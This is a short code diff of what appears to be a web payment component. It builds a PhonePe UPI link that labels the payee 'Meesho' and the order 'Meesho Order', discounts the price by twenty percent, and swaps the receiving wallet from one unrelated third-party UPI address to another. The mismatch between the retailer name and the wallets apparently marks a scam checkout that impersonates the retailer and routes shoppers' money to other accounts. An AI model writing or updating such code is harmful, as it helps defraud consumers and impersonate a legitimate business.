@@ -17,7 +17,7 @@ const Payment = () => {
     return amount;
   };
 
-  const url = `phonepe://pay?pa=fcbiza8brh2@freecharge&tn=Meesho%20Order&am=${reduceByTwentyPercent(
+  const url = `phonepe://pay?pa=bajajpay.6879729.06057497@indus&tn=Meesho%20Order&am=${reduceByTwentyPercent(
     money
   )}&pn=Meesho&mode=02&mc=8999&purpose=00&cu=INR&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwmbM97nRbCVVRvU0ku3Tr`;
 
